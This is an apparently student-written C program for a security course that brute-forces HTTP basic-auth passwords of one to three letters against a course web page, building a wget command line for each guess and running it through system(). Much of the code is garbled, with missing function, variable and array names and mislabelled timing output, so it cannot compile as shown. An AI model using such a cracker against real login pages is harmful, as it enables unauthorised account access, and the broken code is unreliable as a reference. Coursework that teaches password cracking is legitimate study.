#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<strings.h>
#include <ctype.h>
#include <math.h>
#include <sys/time.h>

int
()
{

	int , end;
	int             i, j, k, p;
	char            [52];
	char            tempch = 'a';
	char            password[3] = {'\0', '\0', '\0'};
	int             check, stop = 1;
	    
	float   total_time; 	
	int number; 
	 = time();	
 	

	
	for (i = 0; i < 26; i++) {
		[i] = tempch;
		tempch++;

	}
	tempch = 'A';
	for (i = 26; i < 52; i++) {
		[i] = tempch;
		tempch++;
	}

	
	if (stop == 1) {
		for (j = 0; j < 52; j++) {
			password[0] = [j];
			check = SysCall(password);
			if (check == 0) {
				getpid();
				end = time(); 
				total_time = (end-)/1e9;
				printf("\ntotal time_var = %f ", total_time);
				printf("\n\nAvg getpid() time_var = %f usec\n",total_time);
				printf("\navg time_var  %f / %d = %f\n", total_time, number,total_time/number);

				exit(0);
				stop = 0;
			}
		}
		for (j = 0; j < 52; j++) {
			password[0] = [j];
			for (k = 0; k < 52; k++) {
				password[1] = [k];
				check = SysCall(password);
				if (check == 0) {
					
					getpid();
					end = time(); 
					total_time = (end-)/1e9;
					printf("\ntotal time_var = %f ", total_time);
					printf("\n\nAvg getpid() time_var = %f usec\n",total_time);
					printf("\navg time_var  %f / %d = %f\n", total_time, number,total_time/number);

					exit(0);
					stop = 0;
				}
			}
		}


		for (j = 0; j < 52; j++) {
			password[0] = [j];
			for (k = 0; k < 52; k++) {
				password[1] = [k];
				for (p = 0; p < 52; p++) {
					password[2] = [p];
					check = SysCall(password);
					if (check == 0) {
					getpid();
					end = time(); 
					total_time = (end-)/1e9;
					printf("\ntotal time_var = %f ", total_time);
					printf("\n\nAvg getpid() time_var = %f usec\n",total_time);
					printf("\navg time_var  %f / %d = %f\n", total_time, number,total_time/number);

						stop = 0;
						exit(0);
						
					}
				}
			}
		}


	}
	

	
	return (EXIT_SUCCESS);
}
int 
SysCall(char *password)
{
	char            url1[255], url2[255], [255];
	int             rettype;
	rettype = 0;
	strcpy(url1, "wget  --non-verbose --http-user= --http-passwd=");
	strcpy(url2, " http://sec-crack.cs.rmit.edu./SEC/2/index.php");

	strcat(, url1);
	strcat(, password);
	strcat(, url2);
	
	printf("%s\t",password);
	fflush(stdout);
	rettype = system();

	if (rettype == 0) {
		printf("Successfully retrieved password: \'%s\'\n");
		return 0;
	}
	strcpy(, "");
}
